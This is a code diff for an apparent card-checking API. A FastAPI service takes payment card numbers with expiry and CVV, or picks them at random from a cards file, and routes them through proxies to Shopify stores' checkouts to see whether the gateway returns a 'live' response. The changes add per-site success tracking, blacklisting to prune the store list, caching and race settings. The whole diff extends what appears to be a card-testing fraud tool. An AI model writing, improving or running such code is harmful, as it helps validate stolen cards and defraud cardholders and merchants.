     return JSONResponse(result)
 
 
 @app.get("/check")
 async def check_route(
     site:      str           = Query(..., description="Shopify store URL to check"),
-    card:      Optional[str] = Query(None, description="cc|mm|yy|cvv or cc|mm|yyyy|cvv"),
-    proxy:     Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
+    card:      Optional[str] = Query(None, description="cc|mm|yy|cvv"),
+    proxy:     Optional[str] = Query(None, description="ip:port or user:pass@ip:port"),
     max_price: Optional[float] = Query(None, description="Max product price override"),
     key:       Optional[str] = Query(None, description="API key"),
 ):
-    """
-    Check if a Shopify store has products under ${MAX_PRICE} and whether
-    its payment gateway returns a real (live) response.
-    """
-
-    # ── API key check ──────────────────────────────────────────────
     if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
-        log.warning("Rejected request — invalid key: %r", key)
         return JSONResponse(
             {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
-            status_code=401,
-        )
+            status_code=401)
 
     if not site:
         return JSONResponse({"error": "Missing 'site' parameter"}, status_code=400)
@@ -2007,17 +2125,11 @@ async def check_route(
     if card:
         parsed = _parse_card(card)
         if not parsed:
-            return JSONResponse(
-                {"error": "Bad card format. Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"},
-                status_code=400,
-            )
+            return JSONResponse({"error": "Bad card format."}, status_code=400)
     else:
         cards = _get_cards()
         if not cards:
-            return JSONResponse(
-                {"error": "No cards available. Create cards.txt with one cc|mm|yy|cvv per line."},
-                status_code=400,
-            )
+            return JSONResponse({"error": "No cards available."}, status_code=400)
         parsed = random.choice(cards)
 
     site = site.strip()
@@ -2029,6 +2141,9 @@ async def check_route(
     )
 
     response_code = result.get("Response", "")
+    hostname = urlparse(ourl).netloc
+    _record_site_result(hostname, response_code)
+
     _stats[f"response_{response_code or 'UNKNOWN'}"] += 1
     return JSONResponse({
         "valid":         response_code in LIVE_RESPONSES,
@@ -2043,37 +2158,79 @@ async def check_route(
     })
 
 
+# ── Fix 14: aggregate stats endpoint ─────────────────────────────────────
+@app.get("/site-stats")
+async def site_stats_route():
+    """Per-site success rate + blacklist status — use this to prune sites.txt."""
+    out = {}
+    now = time.time()
+    for host, s in _site_stats.items():
+        total = len(s["outcomes"])
+        if total == 0:
+            continue
+        errs = sum(s["outcomes"])
+        out[host] = {
+            "total":         total,
+            "site_errors":   errs,
+            "success_count": s["success_count"],
+            "error_count":   s["error_count"],
+            "success_rate":  f"{(1 - errs / total) * 100:.1f}%",
+            "blacklisted":   now < s["blacklisted_until"],
+            "blacklist_in":  max(0, int(s["blacklisted_until"] - now)),
+        }
+    return JSONResponse(out)
+
+
 @app.get("/health")
 async def health_route():
-    cards  = _get_cards()
+    cards = _get_cards()
     return JSONResponse({
         "status":           "ok",
         "cards_loaded":     len(cards),
-        "pool_size":        POOL_SIZE,
-        "pool_per_host":    POOL_PER_HOST,
         "site_concurrency": SITE_CONCURRENCY,
         "cache_ttl":        CACHE_TTL,
+        "variant_ttl":      VARIANT_TTL,
         "max_price":        MAX_PRICE,
+        "min_amount":       MIN_AMOUNT,
+        "race_count":       RACE_COUNT,
         "keys_configured":  len(VALID_API_KEYS),
+        "cached_sites":     len(_product_cache),
+        "cached_variants":  len(_variant_cache),
+        "blacklisted_sites": sum(
+            1 for s in _site_stats.values() if time.time() < s["blacklisted_until"]
+        ),
     })
 
 
 @app.get("/stats")
 async def stats_route():
-    """Return request statistics."""
     return JSONResponse(dict(_stats))
 
 
 @app.post("/cache/clear")
 async def cache_clear_route():
-    """Clear the product cache."""
     count = len(_product_cache)
     _product_cache.clear()
+    _variant_cache.clear()
+    return JSONResponse({"cleared": count, "variants_cleared": True})
+
+
+@app.post("/site-stats/clear")
+async def site_stats_clear_route():
+    """Clear per-site circuit-breaker state (useful after adding fresh sites)."""
+    count = len(_site_stats)
+    _site_stats.clear()
     return JSONResponse({"cleared": count})
 
 
 @app.post("/reload")
 async def reload_route():
-    """Reload cards from the cards file."""
     _reload_cards()
     return JSONResponse({"cards_loaded": len(_cards_cache)})
+
+
+# ---------------------------------------------------------------------------
+# Entrypoint (only for local `python api.py`)
+# ---------------------------------------------------------------------------
+if __name__ == "__main__":
+    uvicorn.run("api:app", host="0.0.0.0", port=PORT, workers=1, log_level=LOG_LEVEL.lower())
